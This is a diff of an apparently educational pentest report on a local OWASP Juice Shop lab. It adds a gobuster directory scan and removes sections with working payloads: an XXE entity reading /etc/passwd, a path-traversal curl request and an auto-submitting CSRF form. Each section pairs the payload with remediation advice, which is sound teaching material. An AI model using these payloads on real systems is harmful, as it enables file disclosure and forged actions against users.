@@ -30,11 +30,7 @@
    - [3. Broken Authentication](#3-broken-authentication)
    - [4. Insecure Direct Object Reference (IDOR)](#4-insecure-direct-object-reference-idor)
    - [5. Security Misconfiguration — Exposed Admin Panel](#5-security-misconfiguration--exposed-admin-panel)
-   - [6. Sensitive Data Exposure — Exposed Metrics](#6-sensitive-data-exposure--exposed-metrics)
-   - [7. Broken Access Control — Admin Basket Manipulation](#7-broken-access-control--admin-basket-manipulation)
-   - [8. XML External Entity (XXE) Injection](#8-xml-external-entity-xxe-injection)
-   - [9. Path Traversal — FTP Directory Listing](#9-path-traversal--ftp-directory-listing)
-   - [10. CSRF — Forged User Profile Update](#10-csrf--forged-user-profile-update)
+   - [6. Broken Access Control — Admin Basket Manipulation ⭐ Bonus](#6-broken-access-control--admin-basket-manipulation--bonus)
 5. [Ethical Hacking Report](#ethical-hacking-report)
 6. [Automated Scanning with OWASP ZAP](#automated-scanning-with-owasp-zap)
 7. [Resources](#resources)
@@ -49,7 +45,7 @@
 | **Environment**   | Local Docker container (isolated)      |
 | **Scope**         | `http://localhost:3000`                |
 | **Methodology**   | OWASP Testing Guide v4, PTES           |
-| **Vulnerabilities Found** | 10 (5 mandatory + 5 bonus)    |
+| **Vulnerabilities Found** | 6 (5 mandatory + 1 bonus)     |
 | **OWASP ZAP Scan**| ✅ Performed                          |
 | **Dockerfile Analysis** | ✅ Performed                    |
 
@@ -347,6 +343,12 @@ The Juice Shop administration panel is accessible via a guessable URL without ne
 
 **Step 1** — Without any prior knowledge, run a directory brute-force scan:
 
+```bash
+gobuster dir -u http://localhost:3000 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -t 50 --quiet
+```
+
 **Step 2** — Output reveals: `/#/administration`
 
 **Step 3** — Navigate to `http://localhost:3000/#/administration`.
@@ -368,41 +370,7 @@ The Juice Shop administration panel is accessible via a guessable URL without ne
 
 ---
 
-### 6. Sensitive Data Exposure — Exposed Metrics
-
-**OWASP Category**: A05:2021 — Security Misconfiguration  
-**Severity**: 🟡 Medium  
-**CWE**: CWE-200
-
-#### Description
-
-Prometheus metrics are exposed publicly without authentication, revealing internal application state and performance data.
-
-#### How It Was Exploited
-
-**Step 1** — Navigate to `http://localhost:3000/metrics`.
-
-**Step 2** — The application returns a full dump of internal Prometheus metrics.
-
-```bash
-curl http://localhost:3000/metrics | head -n 10
-```
-
-#### Impact
-
-- Business intelligence leak (e.g., number of registered users, orders placed, active sessions)
-- Insight into internal infrastructure (Node.js version, memory usage, API endpoints)
-- Helpful for an attacker to monitor the success of a denial-of-service (DoS) attack.
-
-#### Remediation
-
-1. **Restrict Access** — Only allow internal network IP addresses to access the `/metrics` endpoint.
-2. **Require Authentication** — Require a valid JWT or Basic Auth token to view metrics.
-3. **Run on a separate port** — Bind the metrics endpoint to a separate internal port not exposed to the public internet.
-
----
-
-### 7. Broken Access Control — Admin Basket Manipulation
+### 6. Broken Access Control — Admin Basket Manipulation ⭐ Bonus
 
 **OWASP Category**: A01:2021 — Broken Access Control  
 **Severity**: 🔴 Critical  
@@ -438,154 +406,6 @@ Authorization: Bearer <user_jwt>
 
 1. **Derive basket ID from the authenticated session** — Never accept `BasketId` from user-supplied request body.
 2. **Authorization middleware** — Validate resource ownership at the API gateway or middleware layer.
-
----
-
-### 8. XML External Entity (XXE) Injection
-
-**OWASP Category**: A05:2021 — Security Misconfiguration  
-**Severity**: 🟠 High  
-**CWE**: CWE-611
-
-#### Description
-
-The B2B order submission endpoint accepts XML input and processes it without disabling external entity resolution, enabling XXE attacks.
-
-#### How It Was Exploited
-
-**Step 1** — Log in to obtain a valid JWT token.
-
-**Step 2** — Craft a malicious XML file (`evil.xml`) targeting the B2B API endpoint:
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<b2bOrder>
-  <orderLines>
-    <orderLine>
-      <productId>1</productId>
-      <quantity>&xxe;</quantity>
-    </orderLine>
-  </orderLines>
-</b2bOrder>
-```
-
-**Step 3** — Submit the payload using the `Authorization` header:
-
-```bash
-curl -X POST http://localhost:3000/b2b/v2/orders \
-  -H "Content-Type: application/xml" \
-  -H "Authorization: Bearer <your_jwt_here>" \
-  -d @evil.xml
-```
-
-The server processes the XML and includes the contents of `/etc/passwd` in the response or error output.
-
-#### Impact
-
-- **Local file disclosure** — Read sensitive server files (`/etc/passwd`, SSL keys, config files)
-- **SSRF** — Make the server issue requests to internal services
-- **Denial of Service** — "Billion laughs" entity expansion attack
-
-#### Remediation
-
-1. **Disable XML external entity processing** — Set `FEATURE_EXTERNAL_GENERAL_ENTITIES` and `FEATURE_EXTERNAL_PARAMETER_ENTITIES` to `false` in the XML parser configuration.
-2. **Use JSON** — Prefer JSON APIs over XML where possible.
-3. **Input validation** — Reject uploads with XML MIME types that are not expected.
-
----
-
-### 9. Path Traversal — FTP Directory Listing
-
-**OWASP Category**: A01:2021 — Broken Access Control  
-**Severity**: 🟠 High  
-**CWE**: CWE-22
-
-#### Description
-
-The application serves files from an unsecured directory without validating that requested paths stay within the intended scope.
-
-#### How It Was Exploited
-
-**Step 1** — Discover the exposed `/ftp/` endpoint (see Vuln #6).
-
-**Step 2** — Attempt to traverse outside the FTP directory:
-
-```bash
-curl "http://localhost:3000/ftp/..%2F..%2Fetc%2Fpasswd"
-```
-
-**Step 3** — The application returns a 403 for direct traversal but the `/ftp/` listing itself exposes confidential files including `package.json.bak` (revealing internal dependency versions and potential CVEs).
-
-```bash
-curl http://localhost:3000/ftp/package.json.bak
-```
-
-This reveals all npm dependencies and their exact versions — enabling targeted CVE exploitation.
-
-#### Impact
-
-- Disclosure of configuration backups, credential files, and internal documentation
-- Intelligence gathering for subsequent attacks
-
-#### Remediation
-
-1. **Remove public file serving endpoints** entirely unless explicitly required.
-2. **Allowlist-based file serving** — Only serve files from a pre-approved list.
-3. **Canonicalize paths** — Resolve `..` sequences server-side before any file access.
-
----
-
-### 10. CSRF — Forged User Profile Update
-
-**OWASP Category**: A01:2021 — Broken Access Control  
-**Severity**: 🟡 Medium  
-**CWE**: CWE-352
-
-#### Description
-
-Some endpoints in Juice Shop lack CSRF token validation, allowing a malicious page to perform state-changing requests on behalf of an authenticated victim.
-
-#### How It Was Exploited
-
-**Step 1** — Identify that the profile image URL update endpoint does not validate a CSRF token:
-
-```http
-POST /profile HTTP/1.1
-Host: localhost:3000
-Cookie: token=<victim_session>
-Content-Type: application/x-www-form-urlencoded
-
-username=attacker_controlled_name
-```
-
-**Step 2** — Host a malicious HTML page that auto-submits this form when visited by an authenticated Juice Shop user:
-
-```html
-<html>
-  <body onload="document.forms[0].submit()">
-    <form action="http://localhost:3000/profile" method="POST">
-      <input type="hidden" name="username" value="HACKED" />
-    </form>
-  </body>
-</html>
-```
-
-**Step 3** — Trick the victim into visiting the malicious page. Their profile is updated without their knowledge.
-
-#### Impact
-
-- Unauthorized state changes on behalf of victims
-- Combined with XSS, can be escalated to full account takeover
-
-#### Remediation
-
-1. **CSRF tokens** — Generate a cryptographically random, per-session token and validate it on every state-changing request.
-2. **`SameSite=Strict` cookies** — Prevent cookies from being sent in cross-origin requests.
-3. **`Origin` / `Referer` header validation** — Reject requests where the origin does not match the expected domain.
-4. **Double-submit cookie pattern** — Include a CSRF token in both the cookie and the request body.
 
 ---
 
